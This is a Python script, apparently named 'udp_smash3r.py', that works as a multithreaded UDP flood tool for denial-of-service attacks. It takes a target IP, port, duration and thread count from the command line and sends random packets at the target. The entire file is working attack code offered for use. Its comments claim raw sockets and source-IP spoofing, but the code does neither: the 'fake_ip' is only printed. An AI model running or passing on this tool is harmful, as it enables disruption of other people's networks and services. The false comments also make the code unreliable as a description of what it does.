import socket  
import random  
import time  
import sys  
from threading import Thread  

def udp_flood(target_ip, target_port, duration, packet_size=100):  
    # Create a raw socket (requires admin/root)  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  

    # Timeout to prevent hangs  
    sock.settimeout(0.5)  

    # Generate random payload  
    payload = random._urandom(packet_size)  

    # Calculate end time  
    end_time = time.time() + duration  
    packets_sent = 0  

    print(f"[!] Attacking {target_ip}:{target_port} for {duration} seconds...")  

    while time.time() < end_time:  
        try:  
            # Spoof source IP (e.g., 192.168.x.x)  
            fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"  
            sock.sendto(payload, (target_ip, target_port))  
            packets_sent += 1  
            print(f"[+] Sent {packets_sent} packets to {target_ip}:{target_port} from {fake_ip}", end="\r")  
        except Exception as e:  
            print(f"[-] Error: {e}")  

    print(f"\n[!] Attack finished. Total packets sent: {packets_sent}") 
    
def start_attack(threads, target_ip, target_port, duration):  
    for _ in range(threads):  
        thread = Thread(target=udp_flood, args=(target_ip, target_port, duration))  
        thread.start()  

if __name__ == "__main__":  
    if len(sys.argv) != 5:  
        print("Usage: python udp_smash3r.py <IP> <PORT> <DURATION> <THREADS>")  
        sys.exit(1)  

    TARGET_IP = sys.argv[1]  
    TARGET_PORT = int(sys.argv[2])  
    DURATION = int(sys.argv[3])  
    THREADS = int(sys.argv[4])  

    print(f"[*] Starting {THREADS} threads...")  
    start_attack(THREADS, TARGET_IP, TARGET_PORT, DURATION)  